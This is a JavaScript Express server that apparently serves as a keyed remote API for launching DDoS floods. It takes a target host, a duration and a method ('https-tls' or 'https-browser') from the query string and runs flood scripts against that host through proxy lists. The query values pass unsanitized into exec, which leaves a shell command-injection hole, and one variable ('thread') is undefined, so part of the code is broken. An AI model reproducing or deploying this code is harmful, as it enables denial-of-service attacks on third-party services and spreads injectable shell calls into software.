const express = require('express');
const app = express();
const port = process.env.PORT || 3000;
const key = "@narul1";
const { exec } = require('child_process');

app.get('/', (req, res) => {
  try {
    const host = req.query.host;
    const time = req.query.time;
    const method = req.query.method;
    const requests = req.query.requests;

    if (req.query.key !== key) {
      return res.status(401).send('Key not working');
    }

    if (method === 'https-tls') {
      const command = `node tlsv5 ${host} ${time} 100 10 p.txt`;
      const ls = exec(command);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) {
          const html = `
            <html>
              <body>
                <h1>Request sent successfully</h1>
                <p>Host: ${host}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('An error occurred during the execution of the process.');
          res.status(500).send('An error occurred during the execution of the process.');
        }
      });
    } else if (method === 'https-browser') {
      const command = `node browser.js ${host} ${time} ${requests} ${thread} proxies.txt`;
      const ls = exec(command);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) {
          const html = `
            <html>
              <body>
                <h1>Request sent successfully</h1>
                <p>Host: ${host}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('An error occurred during the execution of the process.');
          res.status(500).send('An error occurred during the execution of the process.');
        }
      });
    } else {
      console.error('Incorrect method.');
      res.status(400).send('Incorrect method.');
    }
  } catch (error) {
    console.error(error);
    res.status(500).send('There is a problem.');
  }
});

app.listen(port, () => {
  console.log(`API working on ${port} port`);
});
